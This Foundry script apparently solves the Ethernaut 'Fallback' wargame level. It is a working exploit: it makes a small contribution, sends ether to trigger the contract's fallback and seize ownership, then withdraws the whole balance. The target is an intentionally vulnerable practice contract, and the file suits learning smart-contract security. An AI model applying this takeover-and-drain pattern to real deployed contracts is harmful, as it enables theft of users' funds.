// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {Script} from "lib-src/Script.sol";
import {console} from "lib-src/console.sol";

import {Fallback} from "src/Fallback.sol";

// forge script script/1_Fallback.s.sol -vvv
contract FallbackSolution is Script {

    Fallback public target = Fallback(payable(0x6dbaaB22274A0d08808da21a70D27c6A73ae3C2d));
    address public attacker = 0x5F49CfE21B12ffD7fE0dDd11E91b2636F86D7358;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        target.contribute{value: 0.00001 ether}();
        console.log("Contribute success:", target.contributions(attacker) > 0);

        (bool success, ) = address(target).call{value: 0.00001 ether}("");

        if (success) {
            console.log("Owner changed:", target.owner() == attacker);

            target.withdraw();
            console.log("Target balance is zero:", address(target).balance == 0);
        }

        vm.stopBroadcast();
    }
}
